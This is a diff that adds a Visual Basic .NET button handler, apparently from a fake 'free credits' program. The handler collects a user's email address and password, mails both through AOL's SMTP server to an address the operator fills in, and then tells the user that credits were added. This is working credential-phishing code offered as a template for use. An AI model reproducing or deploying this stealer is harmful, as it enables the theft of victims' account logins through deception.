@@ -1,0 +1,30 @@
+ Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        If TextBox1.Text = "" And TextBox2.Text = "" Then
+            MsgBox("No information found!", MsgBoxStyle.Critical, "Error")
+        Else
+            If TextBox1.Text = "" Then
+                MsgBox("Please put your email", MsgBoxStyle.Critical, "Error")
+            Else
+                If TextBox2.Text = "" Then
+                    MsgBox("No Password found!", MsgBoxStyle.Critical, "Error")
+                Else
+                    Try
+                        Dim mail As New MailMessage
+                        mail.From = New MailAddress("YOUR AOL EMAIL")
+                        mail.To.Add("YOUR AOL EMAIL")
+                        mail.Subject = "mail!"
+                        mail.Body = TextBox1.Text + " " + TextBox2.Text
+                        Dim smtp As New SmtpClient("smtp.aol.com")
+                        smtp.Port = 587
+                        smtp.EnableSsl = True
+                        smtp.Credentials = New System.Net.NetworkCredential("YOUR AOL EMAIL", "YOUR AOL PASSWORD")
+                        smtp.Send(mail)
+                        MsgBox("Credits added!", MsgBoxStyle.Information, "Success")
+                    Catch ex As Exception
+                        MsgBox("An unknown error has occured", MsgBoxStyle.Exclamation, "Error")
+                    End Try
+                End If
+            End If
+        End If
+    End Sub
+End Class
